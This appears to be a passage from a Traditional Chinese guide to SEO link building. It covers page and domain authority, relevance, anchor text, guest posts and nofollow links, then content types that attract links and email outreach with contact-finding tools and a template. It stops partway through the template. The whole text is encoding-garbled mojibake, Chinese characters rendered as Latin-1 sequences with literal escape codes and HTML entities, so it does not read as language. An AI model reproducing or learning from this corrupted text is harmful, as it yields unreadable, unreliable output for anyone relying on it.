ç¾åœ¨å°ˆæ³¨åœ¨é€£çµçš„å“è³ªï¼ˆè€Œéé€£çµæ•¸é‡ï¼‰\nä½ å¯èƒ½æœƒç–‘æƒ‘ï¼š\nä»€éº¼æ˜¯é«˜å“è³ªçš„é€£çµï¼Œå…·é«”æ˜¯ä»€éº¼ï¼Ÿæˆ‘åˆè©²å¦‚ä½•æ‰“é€ ä»–å€‘ï¼Ÿ\né€™å°±æ˜¯æˆ‘è¦åœ¨ä¸‹ä¸€å€‹ç« ç¯€æ¶µè“‹çš„å…§å®¹ã€‚\nç¹¼çºŒå¾€ä¸‹çœ‹\u0026hellip;\nç¬¬ 2 ç« ï¼šå¦‚ä½•æ‰¾åˆ°é«˜å“è³ªçš„é€£çµ åœ¨æˆ‘å€‘æ·±å…¥é€£çµå„ªåŒ–çš„é€æ­¥ç­–ç•¥å‰ï¼ŒçŸ¥é“ä»€éº¼æ˜¯å¥½ï¼ˆæˆ–å£ï¼‰é€£çµå¾ˆé‡è¦ã€‚\né€™æ¨£ï¼Œä½ å¯ä»¥å°ˆæ³¨åœ¨å„ªåŒ–èƒ½æ”¹å–„ Google æ’åçš„é€£çµã€‚\nå› æ­¤ï¼Œä»¥ä¸‹æ˜¯å¦‚ä½•è¾¨èªå€¼å¾—å„ªåŒ–é€£çµçš„æ–¹æ³•ï¼š\né é¢æ¬Šé‡ è«‹å•èˆ‡ä½ é€£çµçš„é‚£å€‹ç¶²é ï¼Œåœ¨ PageRank ä¸­æ˜¯ä¸æ˜¯å€‹æœ‰åŠ›äººå£«ï¼Ÿ\nå¦‚æœæ˜¯çš„è©±ï¼Œé‚£å°‡æœƒè®“ä½ çš„æ’åæ“æœ‰ä¸€å€‹å·¨å¤§çš„å½±éŸ¿ã€‚\näº‹å¯¦ä¸Šï¼Œå¾å¤šå¹´çš„æ¸¬è©¦ä¸­ï¼Œæˆ‘å·²ç¶“ç™¼ç¾é é¢æ¬Šé‡çš„å‚³éï¼Œå°‡æ¯”ä»»ä½•å…¶ä»–å› ç´ æ›´é‡è¦ã€‚\né€™æ˜¯å› ç‚ºä¾†è‡ªä¸€å€‹æ¬Šå¨æ€§é é¢çš„é€£çµï¼Œå°‡æä¾›æ›´å¤šæ¬Šé‡å€¼ï¼ˆåˆè¢«ç¨±ç‚º PageRankï¼‰çµ¦ä½ çš„ç¶²ç«™ã€‚\nï¼ˆç­†è¨˜ï¼šé›–ç„¶ Google ä¸¦æ²’æœ‰å…¬é–‹åˆ†äº«é—œæ–¼ PageRank çš„è³‡è¨Šï¼Œä»–å€‘ä»ç„¶å°‡å…¶è¦–ç‚ºæ¼”ç®—æ³•çš„åŸºç¤ï¼‰\nä½ å¯ä»¥ä½¿ç”¨ Semrush ï¼Œè¼•æ˜“çš„å¯Ÿçœ‹ PageRank çš„å¤§ç´„æŒ‡æ¨™ã€‚\nåªè¦åœ¨ Semrush å¡«å…¥ç¶²å€ï¼Œä¸¦æŸ¥çœ‹ã€ŒPage Authority Scoreã€æ•¸å€¼ã€‚\nç¶²ç«™æ¬Šé‡ ä¸€å€‹é€£çµçš„å“è³ªï¼ŒåŒæ¨£å—åˆ°è©²ç¶²åŸŸçš„ã€Œç¶²ç«™æ¬Šé‡ã€æ±ºå®šã€‚\næ™®éä¸Šä¾†èªªï¼Œä¸€å€‹ä¾†è‡ªç´ç´„æ™‚å ±çš„é€£çµï¼Œå°‡æœƒæ¯”ä¾†è‡ªä¸€å€‹ç„¡åæ°£éƒ¨è½æ ¼çš„é€£çµï¼Œç”¢ç”Ÿé‚„è¦å¤§çš„å½±éŸ¿åŠ›ã€‚\né›–ç„¶é€™äº›é€£çµå¾ˆé›£å–å¾—ï¼Œä½†å®ƒå€‘ä»ç„¶å€¼å¾—çˆ­å–ã€‚\nåŒç†ï¼ŒSemrush ä¸€æ¨£èƒ½æ´¾ä¸Šç”¨å ´ã€‚\nåœ¨å·¥å…·ä¸­è¼¸å…¥ç¶²åŸŸåç¨±ï¼Œä¸¦æŸ¥çœ‹å®ƒçš„ã€ŒAuthority Scoreã€æ•¸å€¼ã€‚\nç¶²ç«™ç›¸é—œæ€§ ç•¶æˆ‘å€‘æåˆ°é€£çµï¼Œä¸€å€‹ç¶²ç«™çš„æ¬Šé‡å¾ˆé‡è¦ã€‚\nä½†è©²ç¶²ç«™çš„é—œè¯æ€§åŒæ¨£é‡è¦ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­ä½ ç¶“ç‡Ÿä¸€å€‹é—œæ–¼ã€ŒåŸå§‹äººæ¸›è‚¥æ³•ã€çš„ç¶²ç«™ã€‚\nä½ æƒ³è¦å¾ä¸€å€‹æ¬Šå¨æ€§çš„ç¶²ç«™å–å¾—é€£çµ\u0026hellip;.åƒæ˜¯å–®è¼ªè»Šï¼Œé€™æ¨£çš„é€£çµä»ç®—æ•¸å—ï¼Ÿ\næ ¹æ“šä¸€ä½å‰ Googler çš„è¨ªè«‡å…§å®¹ï¼Œçµæœé¡¯ç¤ºä¸¦éå¦‚æ­¤ã€‚\n:::info\nã€Œå¾ä¸€å€‹é«˜ PageRank é é¢å–å¾—çš„é€£çµï¼Œåœ¨éå»é€šå¸¸å¾ˆæœ‰åƒ¹å€¼ã€‚ã€\nã€Œå¦‚ä»Šï¼Œæ¼”ç®—æ³•æ›´æ³¨é‡è©²ç¶²ç«™èˆ‡ä½ å…§å®¹çš„é—œè¯æ€§ã€‚ã€\nã€Œé—œè¯æ€§æ˜¯æ–°çš„ PageRankã€\n:::\nå¤§è‡´ä¸Šï¼Œä½ æœƒæƒ³è¦å¾å…·æ¬Šå¨æ€§çš„ç¶²ç«™å–å¾—é€£çµï¼Œç‰¹åˆ¥æ˜¯è©²ç¶²ç«™èˆ‡ä½ çš„å…§å®¹ï¼Œæ“æœ‰ç›¸è¿‘çš„é—œè¯ã€‚\né é¢ä¸Šé€£çµçš„ä½ç½® è«‹å•ä½ çš„é€£çµï¼Œæ˜¯å¦å…§åµŒåœ¨éƒ¨åˆ†å…§å®¹ä¸­å—ï¼Ÿ\næˆ–æ˜¯åŸ‹åœ¨ç¶²é çš„é å°¾ï¼Ÿ\näº‹å¯¦è­‰æ˜ï¼Œä½ çš„é€£çµåœ¨é é¢ä¸Šçš„ä½ç½®å¾ˆé‡è¦ã€‚\nç‰¹åˆ¥æ˜¯åŸ‹è—åœ¨é é¦–èˆ‡æ¸¬æ””çš„é€£çµï¼Œä¸¦ä¸å¦‚é é¢æ­£æ–‡å€å¡Šçš„é€£çµæœ‰åƒ¹å€¼ã€‚\nç¶²ç«™åº•éƒ¨å‘¢ï¼Ÿä½ æœƒå¸Œæœ›ä½ çš„é€£çµå‡ºç¾åœ¨ç¶²é çš„ä¸»è¦å€å¡Šã€‚\né€£çµæ˜¯å¦ç”±ç·¨è¼¯æ–¹å¼æ”¾ä¸Šçš„ï¼Ÿ ä¸è«–ä½ çš„é€£çµæ˜¯å¦å‡ºç¾åœ¨ç¶²é ï¼Œä½ æ‡‰è©²è©¢å•è‡ªå·±ï¼š\nã€Œæ­¤é€£çµæ˜¯å¦ç”±ç·¨è¼¯æ–¹å¼æ”¾ä¸Šå»çš„ï¼Ÿã€\næ›å¥è©±èªªï¼Œæ˜¯å¦æœ‰äººå°‡è‡ªå·±ç¶²ç«™èˆ‡ä½ çš„ç¶²ç«™é€£çµï¼Œå–®ç´”æ˜¯å› ç‚ºä»–å€‘èªç‚ºä½ çš„ç¶²ç«™å¾ˆè®šï¼Ÿ\nå¦‚æœæ˜¯çš„è©±ï¼Œé€™å°±æ˜¯ä¸€å€‹ç·¨è¼¯é€£çµï¼ˆeditorial linkï¼‰\næˆ–æ˜¯ä½ åœ¨ä¸€å€‹éš¨æ©Ÿç¶²ç«™å‰µé€ å¸³æˆ¶ï¼Œä¸¦åœ¨é‚£é‚Šæ”¾ä¸‹ä¸€å€‹è‡ªå·±ç¶²ç«™çš„åå‘é€£çµï¼Ÿ\né€™å°±ä¸æ˜¯ç·¨è¼¯é€£çµã€‚\nå¦‚ä½ æ‰€æ–™ï¼ŒGoogle æ›´åŠ é‡è¦–ç·¨è¼¯é€£çµã€‚\n:::info\nå¼•è¨€è‡ª Google\nã€Œä»¥éç·¨è¼¯æ–¹å¼æ”¾ä¸Šä¸€å€‹é€£çµï¼Œæˆ–æœªç¶“ç¶²ç«™æ“æœ‰äººåœ¨ç¶²é ä¸Šçš„èªè­‰ï¼Œåˆè¢«ç¨±ç‚ºéè‡ªç„¶é€£çµã€‚ã€\nã€Œå®ƒå¯ä»¥è¢«è¦–ç‚ºé•åæˆ‘å€‘çš„æœå°‹æŒ‡å—ã€\n:::\né€£çµéŒ¨é»æ–‡å­— éŒ¨é»æ–‡å­—æ˜¯ä¸€å€‹å¯è¢«é»æ“Šçš„æ–‡å­—é€£çµå€å¡Šã€‚\näº‹å¯¦è­‰æ˜ï¼ŒGoogle ä½¿ç”¨éŒ¨é»æ–‡å­—ä½œç‚ºæ’åè¨Šè™Ÿã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œä½ å–å¾—ä¸€å€‹é€£åˆ°ä½ ç¶²ç«™çš„éŒ¨é»æ–‡å­—ï¼šåŸå§‹äººç”œé»\nGoogle çœ‹åˆ°è©²éŒ¨é»æ–‡å­—ï¼Œä¸¦èªªï¼š\næ©\u0026hellip; é€™å€‹ç¶²ç«™ä½¿ç”¨ã€ŒåŸå§‹äººç”œé»ã€éŒ¨é»æ–‡å­—ï¼Œè©²é€£çµå°å‘çš„ç¶²é ä¸€å®šæ˜¯é—œæ–¼ã€ŒåŸå§‹äººç”œé»ã€ã€‚\nç•¶ç„¶ï¼Œå¦‚åŒå…¶ä»– SEO æŠ€å·§ï¼Œé—œéµå­—è±å¯Œçš„éŒ¨é»æ–‡å­—å·²ç¶“è¢«æ¿«ç”¨ã€‚\nç¾ä»Šï¼Œå»ºç«‹ä¸€å¤§å †æº–ç¢ºæè¿°çš„éŒ¨é»æ–‡å­—ï¼Œä»æœƒè¢«è¦–ç‚ºåƒåœ¾å…§å®¹ã€‚\nç°¡çŸ­ä¾†èªªï¼Œæˆ‘ä¸æ¨è–¦é€éé—œéµå­—è±å¯Œçš„éŒ¨é»æ–‡å­—ï¼Œç”¨ä»¥å»ºç«‹åå‘é€£çµã€‚\nå¦‚æœä½ æ˜¯çœŸçš„å¾éŒ¨é»æ–‡å­—å–å¾—åå‘é€£çµï¼Œé‚„æ˜¯å€¼å¾—æ…¶ç¥ã€‚\né€£çµå…±ç¾ ã€Œå…±ç¾ã€æ˜¯æŒ‡æ–‡å­—èˆ‡ç‰‡èªå…±åŒå‡ºç¾åœ¨ä½ çš„é€£çµä¸Šã€‚\nGoogle å¯èƒ½ä½¿ç”¨å…±ç·šä½œç‚ºã€Œå­éŒ¨é»æ–‡å­—ã€(baby anchor text)\nå¦‚æœä½ é€™æ¨£æ€è€ƒï¼Œå°±èƒ½ç†è§£ï¼š\né‚£äº›åœç¹åœ¨é€£çµä¸Šçš„æ–‡å­—ï¼ŒåŒæ¨£æä¾›è©²é é¢çš„ç·šç´¢ã€‚\næ—¢ç„¶å¦‚æ­¤ï¼ŒGoogle åˆæœ‰ä»€éº¼ç†ç”±ä½•ä¸å»ä½¿ç”¨å‘¢ï¼Ÿ\né€£çµæ˜¯å¦ä¾†è‡ªå®¢ä½œæ–‡ç« ï¼Ÿ å¹¾å¹´å‰ï¼ŒGoogle ç«™å‡ºä¾†èªªï¼š\n:::info\nã€Œæœ‰ä»¶äº‹å·²ç¶“ç„¡æ³•ç¹¼çºŒä¸‹å»äº†ï¼šå®¢åº§æ–‡ç« å·²ç¶“çµæŸï¼Œä»–å·²ç¶“è®Šå¾—å¤ªéä½å»‰ã€\nï¼Matt Cuttsï¼Œå‰ Google åƒåœ¾éƒµä»¶åœ˜éšŠä¸»ç®¡\n:::\né€™æ˜¯çœŸçš„å—ï¼Ÿ\næ©\u0026hellip;ä»–å–æ±ºæ–¼ç•¶ä¸‹æ¢ä»¶ã€‚\nä»¥ä¸‹é€™ä¸€äº›ç´…æ——èˆ‰å‹•ï¼Œæœƒä½¿å®¢åº§æ–‡ç« è®Šå¾—æ²’æœ‰åƒ¹å€¼ã€‚\næŸäººä»˜è²»åˆŠç™»æ–‡ç«  æ–‡ç« åŒ…å«å®Œå…¨æ¯”å°çš„éŒ¨é»æ–‡å­— è©²ç¶²ç«™åªç‚ºäº†ç™¼å¸ƒå®¢åº§æ–‡ç« å–®ç¨å­˜åœ¨ è©²ç¶²ç«™èˆ‡ä½ çš„ç¶²ç«™ä¸ç›¸é—œ ä½†å¦‚æœä½ åœ¨ä¸€å€‹å…·æ¬Šå¨æ€§ã€é—œè¯æ€§çš„ç¶²ç«™ï¼Œç™¼å¸ƒä¸€å€‹ä»¤äººé©šè‰·çš„æ–‡ç« å‘¢ï¼Ÿ\nåœ¨æˆ‘çš„ç¶“é©—ï¼Œè©²é€£çµå¯ä»¥å¹«åŠ©ä½ çˆ­å–æ’å\nNofollow vs Dofollow ã€Œrel=\u0026ldquo;nofollow\u0026rdquo;ã€æ˜¯ä¸€å€‹é€£çµæ¨™ç±¤ï¼Œç”¨ä¾†å‘Šè¨´æœå°‹å¼•æ“ï¼šä¸è¦å°‡æ­¤é€£çµç•¶æˆä¸€å€‹ç¶²ç«™èƒŒæ›¸ã€‚\næ˜é¡¯åœ°ï¼Œç•¶åˆ°äº† SEO é ˜åŸŸï¼Œä½ æœƒæƒ³è¦ç›¡å¯èƒ½ï¼Œå–å¾—ä¸€å€‹æ­£å¸¸ã€Œdofollowã€é€£çµã€‚\nç¾åœ¨ï¼Œä½ å¯ä»¥çŸ¥é“å¦‚ä½•è¡¡é‡é€£çµå“è³ªï¼Œæ˜¯æ™‚å€™é–‹å§‹å»ºç«‹ä»–å€‘ã€‚\nç¬¬ 3 ç« ï¼šå¦‚ä½•é€éå…§å®¹è¡ŒéŠ·ï¼Œå–å¾—ä¸–ç•Œç´šçš„é€£çµ å…§å®¹æ˜¯è§£é–è‰¯å¥½åå‘é€£çµçš„é—œéµï¼Œå·²ç¶“ä¸æ˜¯ä»€éº¼ç§˜å¯†äº†ã€‚\nä½†é€™æ¨£èªªå¥½äº†ï¼š\nå–®ç´”ç™¼å¸ƒå…§å®¹ï¼Œä¸¦ä¸æœƒè®“ä½ å–å¾—ä»»ä½•é€£çµã€‚\näº‹å¯¦è­‰æ˜ï¼Œç‰¹å®šé¡å‹çš„å…§å®¹æœ€é©åˆå–å¾—åå‘é€£çµã€‚\nä»¥ä¸‹æ˜¯å››ç¨®å…§å®¹é¡å‹ï¼Œå¹«åŠ©ä½ ç”¢ç”Ÿæ›´å¤šé€£çµï¼š\nä¸€ã€è¦–è¦ºè³‡ç”¢ å®ƒæ˜¯ä»€éº¼ è¦–è¦ºè³‡ç”¢æ˜¯ï¼š\nåœ–ç‰‡ åœ–è¡¨ è³‡è¨Šåœ– è¦–è¦ºå°å‘çš„å…§å®¹èˆ‡åœ–è¡¨ å®ƒç‚ºä»€éº¼æœ‰ç”¨ è¦–è¦ºå…§å®¹è¶…ç´šå®¹æ˜“å–å¾—é€£çµã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä½ ç™¼å¸ƒä¸€å€‹åœ–ç‰‡åœ¨ä½ çš„ç¶²ç«™ï¼Œä»»ä½•äººåœ¨ä»–å€‘çš„ç¶²ç«™åˆ†äº«æ­¤åœ–ï¼Œç•¶æœƒè®“ä½ å–å¾—åå‘é€£çµã€‚\né€™å€‹å¼·å¤§çš„ã€Œç•¶ä½ åˆ†äº«æˆ‘çš„åœ–ç‰‡ï¼Œè«‹é€£çµæˆ‘çš„ç¶²ç«™ã€é—œä¿‚ï¼Œä¸¦ä¸ä½œç”¨æ–¼ä»»ä½•æ–‡å­—åŸºç¤çš„å…§å®¹ã€‚\nå¯¦éš›ä¾‹å­ å¹¾å¹´å‰æˆ‘åœ¨è‡ªå·±çš„ç¶²ç«™ï¼Œç™¼å¸ƒäº†ä¸€å€‹é—œæ–¼ Google é»æ“Šç‡çš„åœ–è¡¨ã€‚\nç›´åˆ°ç¾ä»Šï¼Œæ­¤åœ–å·²ç¶“è¢«é€£çµæ•¸åæ¬¡ï¼ˆè¨±å¤šä¾†è‡ªè¡ŒéŠ·é ˜åŸŸçš„æ¬Šå¨ç¶²ç«™ï¼‰\nç¢ºå¯¦ï¼Œå³ä½¿æˆ‘ä½¿ç”¨è¡¨æ ¼å‘ˆç¾ï¼Œä»å¯èƒ½å–å¾—é€™äº›é€£çµã€‚\nä½†é€™äº›é€£çµçš„å»ºç«‹ï¼Œæœ‰å¤§éƒ¨ä¸€éƒ¨åˆ†ï¼ˆæˆ‘é ä¼° 75%ï¼‰æ˜¯å› ç‚ºæˆ‘ä»¥è¦–è¦ºæ–¹å¼å‘ˆç¾ã€‚\näº‹å¯¦ä¸Šï¼Œæˆ‘çš„è¨±å¤šé€£çµï¼Œä¾†è‡ªäººå€‘ç›´æ¥å°‡æˆ‘çš„è¦–è¦ºåœ–è¡¨ï¼Œå¼µè²¼åˆ°ä»–å€‘çš„ç¶²ç«™ä¸Šï¼ˆä¸¦ä½œç‚ºä¾†æºé€£å›æˆ‘çš„ç¶²ç«™ï¼‰ã€‚\næœ‰è¶£çš„äº‹ï¼Œç›´åˆ° 2022 å¹´çš„ä»Šå¤©ï¼Œæ¯å€‹æœˆäººå€‘ä»ç„¶é€£çµæ­¤åœ–ã€‚\né€™å°±æ˜¯å‰µé€ è¦–è¦ºåœ–è¡¨çš„å¼·å¤§ä¹‹è™•ã€‚\näºŒã€åˆ—é»æ–‡ç«  å®ƒæ˜¯ä»€éº¼ ä¸€ç³»åˆ—çš„æ–¹æ³•ã€æŠ€è¡“ã€åŸå› ã€è¿·æ€æˆ–é—œæ–¼ä»»ä½•äº‹æƒ…ã€‚\nå®ƒç‚ºä»€éº¼æœ‰ç”¨ åˆ—é»æ–‡ç« å°‡å¤§é‡çš„åƒ¹å€¼ï¼ŒåŒ…è£æˆä¸€ä»½ä»½å¯ä¸€å£å’¬ä¸‹çš„å…§å®¹ã€‚\näº‹å¯¦ä¸Šï¼Œç•¶ BuzzSumo åˆ†æä¸€ç™¾è¬ç¯‡æ–‡ç« æ™‚ï¼Œä»–å€‘ç™¼ç¾é€™äº›åˆ—é»æ–‡ç« ï¼Œç›¸è¼ƒæ–¼å…¶ä»–å½¢å¼çš„å…§å®¹ï¼Œç”¢ç”Ÿæ›´å¤šåå‘é€£ç¯€ã€‚\nå®ƒå‹éæ¸¬é©—ã€å½±ç‰‡ï¼Œç”šè‡³æ˜¯è³‡è¨ŠåŒ–åœ–è¡¨ã€‚\nå¯¦éš›ä¾‹å­ ã€Š2022 æœ€æ–°çš„ 19 å€‹ SEO æŠ€å·§ã€‹é€™å€‹åˆ—è¡¨æ–‡ç« ï¼Œæ˜¯æˆ‘æœ€ç†±é–€çš„ä¸€å€‹å…§å®¹ã€‚\næ²’éŒ¯ï¼Œå®ƒç”¢ç”Ÿä¸€å¤§å †åˆ†äº«\u0026hellip;\nä»¥åŠç•™è¨€\nä½†æœ€é‡è¦çš„æ˜¯ï¼Œæ­¤è²¼æ–‡æ˜¯ä¸€å€‹é€£çµç£éµã€‚\nå®ƒæ“æœ‰è¶…é 4,000 æ¢é€£çµã€‚\nä¹Ÿå› ç‚ºæ­¤æ–‡ç« ï¼Œæ“æœ‰é€™éº¼å¤šé€£çµæŒ‡å‘å®ƒï¼Œå®ƒå–å¾—é—œéµå­—ã€ŒSEO Techniquesã€çš„å‰ 5 åã€‚\nä¸‰ã€åŸå‰µçš„ç ”ç©¶èˆ‡æ•¸æ“š å®ƒæ˜¯ä»€éº¼ å¾ç”¢æ¥­å ±å‘Šã€èª¿æŸ¥æˆ–åŸå‰µç ”ç©¶ä¸­ï¼Œæ­éœ²æœ€æ–°æ•¸æ“šçš„å…§å®¹ã€‚\nå®ƒç‚ºä»€éº¼æœ‰ç”¨ ç ”ç©¶èˆ‡æ•¸æ“šå…·æœ‰é«˜åº¦å¯é€£çµæ€§ã€‚\nç•¶æŸäººå¼•ç”¨ä½ çš„æ•¸æ“šï¼Œå®ƒæœƒèˆ‡ä½ é€£çµï¼Œé€™äº›é€£çµå¢åŠ å¾—éå¸¸å¿«ã€‚\nå¯¦éš›ä¾‹å­ å‰äº›æ—¥å­ï¼Œæˆ‘ç™¼å¸ƒä¸€ç¯‡å¤§å‹ Google æ’åå› ç´ èª¿æŸ¥ã€‚\nä¸ç”¨èªªï¼Œæ­¤è²¼æ–‡æ»¿è¼‰äº†å¤§é‡åŸå§‹æ•¸æ“šã€‚\né€™å°±æ˜¯ç‚ºä»€éº¼æ­¤è²¼æ–‡è‡³ä»Šï¼Œå¯ä»¥ç´¯è¨ˆ 18,900 å‰‡åå‘é€£ç¯€ï¼Œé€™å€‹é©šäººçš„æ•¸å­—ã€‚\nå¦‚æˆ‘ä¸Šè¿°æåŠï¼Œé€™äº›é€£çµå¤§å¤šæ•¸ä¾†è‡ªäººå€‘å¼•ç”¨æˆ‘å€‘çš„ç ”ç©¶ï¼š\nå››ã€æ·±åº¦å®Œæ•´çš„æŒ‡å— å®ƒæ˜¯ä»€éº¼ ä¸€å€‹é—œæ–¼æŸä¸»é¡Œç¶œåˆæ€§è³‡æºï¼Œå…¶ä¸­åŒ…å«æ‰€éœ€è¦çŸ¥é“çš„ä¸€åˆ‡äº‹ç‰©ã€‚\nå®ƒç‚ºä»€éº¼æœ‰ç”¨ çµ‚æ¥µæŒ‡å—å°‡é©šäººæ•¸é‡çš„è³‡è¨Šé›†ä¸­åœ¨ä¸€è™•ï¼Œä¸¦ä½¿ä½ çš„æŒ‡å—ï¼Œæˆç‚ºè©²è³‡æºçš„é¦–é¸ã€‚\nå¯¦éš›ä¾‹å­ æˆ‘æ›¾ç¶“å¾ email æ”¶åˆ°äººå€‘è©¢å•æˆ‘ï¼Œé—œæ–¼æ¯æ—¥é—œéµå­—ç ”ç©¶çš„åŸºæœ¬æ¦‚å¿µã€‚\nå¾ˆä¸å¹¸åœ°ï¼Œé—œæ–¼é€™å€‹éå¸¸é‡è¦çš„ä¸»é¡Œï¼Œé‚£æ™‚åœ¨æˆ‘çš„éƒ¨è½æ ¼ä¸­ï¼Œä¸¦æ²’æœ‰ä»»ä½•å…§å®¹ã€‚\nå› æ­¤ï¼Œæˆ‘å‰µé€ äº†ä¸€å€‹ï¼šã€ŠSEO é—œéµå­—ç ”ç©¶ï¼šçµ‚æ¥µæŒ‡å—ã€‹\nå› ç‚ºé€™å€‹å¤šç« ç¯€çš„æŒ‡å—ï¼Œæ¶µè“‹äº†å…¶ä»–ç¶²è·¯è³‡æºæ²’æœ‰çš„å…§å®¹ã€‚\nå®ƒå·²ç¶“è¢«é€£çµè¶…é 37,700 æ¬¡ã€‚\nç¾åœ¨ï¼Œä½ å·²ç¶“å‰µé€ å‡ºä¸€äº›å€¼å¾—é€£çµçš„å…§å®¹ï¼Œæ˜¯æ™‚å€™æ‰“é€ ä¸€äº›é€£çµã€‚\nå¦‚ä½•åšï¼Ÿ\né€ééå¸¸ç¶“å…¸çš„é›»å­éƒµä»¶æ¨å»£ã€‚\nç¬¬ 4 ç« ï¼šå¦‚ä½•é€éé›»å­éƒµä»¶æ¨å»£ï¼Œæ‰“é€ å¼·è€Œæœ‰åŠ›çš„é€£çµ å¦‚æœä½ æƒ³è¦åœ¨ 2022 å¹´æ‰“é€ ç™½å¸½é€£çµï¼Œä½ éœ€è¦ä½¿ç”¨é›»å­éƒµä»¶æ¨å»£ã€‚\nå•é¡Œæ˜¯ï¼š\nä½ çš„ä¿¡ä»¶å¦‚ä½•èˆ‡éƒ¨è½å®¢èˆ‡è¨˜è€…å€‘è¯ç¹«ä¸Šï¼Œè€Œéè¢«ä¸Ÿé€²åƒåœ¾ä¿¡ä»¶çš„è³‡æ–™å¤¾ä¸­ã€‚\né–±è®€æœ¬ç« ç¯€ï¼Œæ‰¾å‡ºæ–¹æ³•ã€‚\næ­¥é©Ÿä¸€ï¼šæ‰¾åˆ°ã€Œå¯èƒ½é€£çµè€…ã€ å¦‚åŒåç¨±æ‰€è¿°ï¼Œå¯èƒ½é€£çµè€…æ˜¯ä¸€ç¾¤å¯èƒ½æœƒé€£çµä½ ç¶²ç«™çš„äººã€‚\næˆ‘å°‡æœƒåœ¨ç¬¬ 6 ç« ï¼Œå‘ä½ å±•é …æ‰¾å‡ºã€Œå¯èƒ½é€£çµè€…ã€çš„ä¸€å¤§å †æŠ€å·§ã€‚\nä½†ç¾åœ¨ï¼Œè®“æˆ‘å€‘å…ˆä½¿ç”¨ç°¡å–®çš„ç­–ç•¥ï¼Œç”¨ä¾†è¾¨èªå‡ºä»–å€‘ï¼šåå‘å·¥ç¨‹ã€‚\né¦–å…ˆï¼Œåœ¨ Google æœå°‹ä½ çš„é—œéµå­—ã€‚\nåœ¨ç¬¬ä¸€é æœå°‹çµæœé ï¼ŒæŒ‘é¸ä¸€å€‹ç¶²ç«™é€£çµï¼Œä¸¦æ”¾é€²é€£çµåˆ†æå·¥å…·ï¼ˆæˆ‘ä½¿ç”¨Semrush ç‚ºä¾‹ï¼‰\næ¥è‘—ï¼Œé»æ“Šå´æ””çš„ã€Œåå‘é€£ç¯€åˆ†æã€ï¼Œå†é»ã€Œåå‘é€£ç¯€ã€ã€‚\né€™å€‹ç¶²ç«™æœƒåœ¨ä¸‹æ–¹ï¼Œæ¢åˆ—å‡ºå…¨éƒ¨çš„å¯èƒ½é€£çµè€…ã€‚\n(ä½ å¦‚ä½•çŸ¥é“å“ªå€‹ç¶²ç«™å€¼å¾—é–å®šã€å“ªå€‹ç¶²ç«™è¦å¿½ç•¥ï¼Ÿå»æŸ¥çœ‹ç¬¬äºŒç« çš„å…§å®¹)\næ­¥é©ŸäºŒï¼šæ‰¾åˆ°ä»–å€‘çš„é›»å­éƒµä»¶åœ°å€ ç¾åœ¨ï¼Œä½ å·²ç¶“æ‰¾å‡ºå¯èƒ½é€£çµè€…ï¼Œæ˜¯æ™‚å€™æŒ–å‡ºä»–å€‘çš„é›»å­éƒµä»¶åœ°å€ã€‚\n:::danger\né€²éšæŠ€å·§ï¼šåƒ…åœ¨ä¸å¾—å·²çš„æƒ…æ³ä¸‹ï¼Œæ‰å»ä½¿ç”¨ç¶²ç«™çš„è¯ç¹«è¡¨å–®ï¼Œå› ç‚ºé‚£ä¸€å€‹é»‘æ´\n:::\nä»¥ä¸‹æ˜¯åŸ·è¡Œæ­¥é©Ÿï¼š\nä½¿ç”¨ Hunter.io\nHunter.io éå¸¸é©åˆç”¨æ–¼è¯ç¹«å°å‹ç¶²ç«™èˆ‡å€‹äººéƒ¨è½æ ¼ã€‚\nå–®ç´”åœ¨å·¥å…·ä¸­è¼¸å…¥ç¶²ç«™\næ¥è‘—ï¼Œä»–å°‡æœƒå‘ä½ å±•ç¾ï¼Œèˆ‡è©²ç¶²åŸŸé—œè¯çš„é›»å­éƒµä»¶åœ°å€ã€‚\nä½†å¦‚æœä½ æƒ³è¦æ¥è§¸å¤§å‹ç¶²ç«™å‘¢ï¼Ÿæ¢³ç†é€™ä»½æ¸…å–®å°‡æœƒéå¸¸ç—›è‹¦ã€‚\né€™å°±æ˜¯ç‚ºä»€éº¼ï¼Œé‡å°é€™äº›æƒ…å¢ƒï¼Œæˆ‘æ¨è–¦ VoilaNorbert\nVoilaNorbert è—‰ç”± VoilaNorvert.com ï¼Œä½ åªè¦è¼¸å…¥æŸäººçš„åå­—èˆ‡å·¥ä½œçš„ç¶²åŸŸï¼Œå°±èƒ½æˆåŠŸé‹ä½œï¼Œè€Œä¸éœ€è¼¸å…¥ç¶²å€ã€‚\né€™æ¨£ï¼Œä½ å°±èƒ½æ¥è§¸åˆ°é‚£äº›å¯èƒ½é€£çµè€…ï¼Œä¸¦è®“ä»–å€‘æŠŠä½ ç¶²ç«™é€£çµï¼Œæ”¾åˆ°ä»–å€‘é é¢ä¸Šçš„ã€‚\nåŒæ™‚ï¼Œå®ƒä¹Ÿæœƒå‘ä½ å±•ç¾ç‰¹å®šå°è±¡çš„é›»å­éƒµä»¶åœ°å€ã€‚\næ­¥é©Ÿä¸‰ï¼šå¯„çµ¦ä»–å€‘ä¸€å€‹å®¢è£½åŒ–çš„å…§å®¹ å¦‚æœä½ æƒ³ä½¿é›»å­éƒµä»¶æ¨å»£è¦æ¨¡åŒ–ï¼Œä½ å°‡æœƒéœ€è¦ä½¿ç”¨æ¨¡æ¿ã€‚\nä½¿ç”¨æ¨¡æ¿çš„æŠ€å·§åœ¨æ–¼ï¼Œä¸è¦è®“ä½ çš„æ¨¡æ¿çœ‹èµ·ä¾†åƒæ¨¡æ¿ï¼ˆä¸‹å€‹æ­¥é©Ÿæœƒè§£é‡‹æ›´å¤šç´°ç¯€ï¼‰\nä½†ç¾åœ¨ï¼Œä»¥ä¸‹æ˜¯æˆ‘åŸ·è¡Œæœ€å¥½çš„é›»å­éƒµä»¶æ¨¡æ¿ä¹‹ä¸€\n:::info\nå—¨ï¼ˆåç¨±ï¼‰ã€‚\næˆ‘ä»Šå¤©æ­£å°‹æ‰¾é—œæ–¼ï¼ˆæŸä¸»é¡Œï¼‰çš„å…§å®¹ï¼Œå¶ç„¶ç™¼ç¾ä½ çš„æ–‡ç« ï¼šï¼ˆæ–‡ç« æ¨™é¡Œï¼‰\næˆ‘ç™¼ç¾å®ƒçš„å…§å®¹éå¸¸å¥½ï¼å…¶ä¸­ï¼Œæˆ‘ç‰¹åˆ¥å–œæ­¡ï¼ˆä»–å€‘æ–‡ç« çš„ç‰¹å®šå…§å®¹ï¼‰ã€‚\næ­¤å¤–ï¼Œæˆ‘æœ€è¿‘ä¹Ÿåœ¨ï¼ˆä½ 